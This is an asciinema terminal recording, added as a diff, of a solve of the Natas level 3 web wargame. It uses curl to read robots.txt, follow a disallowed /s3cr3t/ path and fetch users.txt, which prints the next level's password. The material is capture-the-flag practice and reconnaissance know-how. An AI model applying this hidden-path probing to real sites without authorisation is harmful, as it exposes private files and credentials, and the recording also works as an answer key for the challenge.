@@ -1,0 +1,8 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469342,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L3.sh","title":"Natas L3 solve","env":{"SHELL":"/bin/bash"}}
+[0.009, "o", "$ curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/robots.txt\r\r\n"]
+[0.569, "o", "User-agent: *\r\r\nDisallow: /s3cr3t/\r\r\n"]
+[0.000, "o", "$ curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/\r\r\n"]
+[0.380, "o", "href=\"?C=N;O=D\"\r\r\nhref=\"?C=M;O=A\"\r\r\nhref=\"?C=S;O=A\"\r\r\nhref=\"?C=D;O=A\"\r\r\nhref=\"/\"\r\r\nhref=\"users.txt\"\r\r\n"]
+[0.001, "o", "$ curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt\r\r\n"]
+[0.495, "o", "natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth\r\r\n"]
+[0.003, "x", "0"]
